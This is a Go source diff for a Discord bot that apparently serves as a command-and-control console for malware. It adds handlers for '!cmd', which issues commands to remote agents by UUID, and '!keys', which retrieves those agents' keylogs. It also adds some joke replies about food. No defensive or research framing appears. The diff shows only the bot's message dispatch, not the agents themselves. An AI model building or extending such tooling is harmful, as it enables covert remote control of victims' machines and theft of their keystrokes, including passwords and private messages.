@@ -32,7 +32,7 @@ func newMsg(discord *discordgo.Session, message *discordgo.MessageCreate) {
 	}
 	switch {
 	case strings.Contains(message.Content, "!help"):
-		discord.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!refresh <uuid>` to get agent commands/refresh\nUse `!cmd <uuid> <command>` to issue commands to the agent\nUse `!keys <uuid>` to get keylogs")
+		discord.ChannelMessageSend(message.ChannelID, "Use `!agents` to list agents\nUse `!refresh <uuid>` to get agent commands/refresh\nUse `!cmd <uuid> ^command^` to issue commands to the agent\nUse `!keys <uuid>` to get keylogs")
 	case strings.Contains(message.Content, "!refresh"):
 		logger.Logf(logger.Info, "Bot received !refresh triggered :"+message.Content+"\n")
 		agentBot := command.GetBotAgent(message.Content)
@@ -41,8 +41,24 @@ func newMsg(discord *discordgo.Session, message *discordgo.MessageCreate) {
 		logger.Logf(logger.Info, "Bot received !agents triggered :"+message.Content+"\n")
 		agentsBot := command.GetBotAgents()
 		discord.ChannelMessageSendComplex(message.ChannelID, agentsBot)
+	case strings.Contains(message.Content, "!keys"):
+		logger.Logf(logger.Info, "Bot received !keys triggered :"+message.Content+"\n")
+		agentsBot := command.GetBotKeys(message.Content)
+		discord.ChannelMessageSendComplex(message.ChannelID, agentsBot)
+	case strings.Contains(message.Content, "!cmd"):
+		logger.Logf(logger.Info, "Bot received !cmd triggered :"+message.Content+"\n")
+		agentsBot := command.PostBotCmd(message.Content)
+		discord.ChannelMessageSendComplex(message.ChannelID, agentsBot)
+	// case strings.Contains(message.Content, "!cmd"):
+	// 	discord.ChannelMessageSend(message.ChannelID, "piss off")
 	case strings.Contains(message.Content, "milk"):
 		discord.ChannelMessageSend(message.ChannelID, "I love milk")
+	case strings.Contains(message.Content, "steak"):
+		discord.ChannelMessageSend(message.ChannelID, "I love steak")
+	case strings.Contains(message.Content, "pizza"):
+		discord.ChannelMessageSend(message.ChannelID, "https://giphy.com/gifs/pizza-i-love-lover-VbU6X60pTQxUY")
+	case strings.Contains(message.Content, "soda"):
+		discord.ChannelMessageSend(message.ChannelID, "I love soda")
 	}
 }
 
